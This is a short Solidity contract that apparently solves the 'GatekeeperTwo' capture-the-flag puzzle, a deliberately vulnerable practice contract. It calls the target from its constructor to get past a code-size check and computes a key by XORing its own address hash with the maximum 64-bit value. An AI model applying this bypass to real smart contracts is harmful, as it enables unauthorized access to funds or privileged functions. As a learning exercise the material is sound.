pragma solidity >=0.4.22 <0.9.0;
import './GatekeeperTwo.sol';

contract Exo14 {
    // 32 limit -> 4294967295
    GatekeeperTwo gateKeeperTwo;

    constructor(address _target) public {
        gateKeeperTwo = GatekeeperTwo(_target);
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1);
        gateKeeperTwo.enter(bytes8(gateKey));
       // bytes8 key = bytes8(abi.encodePacked(address(this))) ^ (uint64(0) - 1);
     //   address(gateKeeperTwo).call(abi.encodeWithSignature("enter(bytes8)", key));
    }

}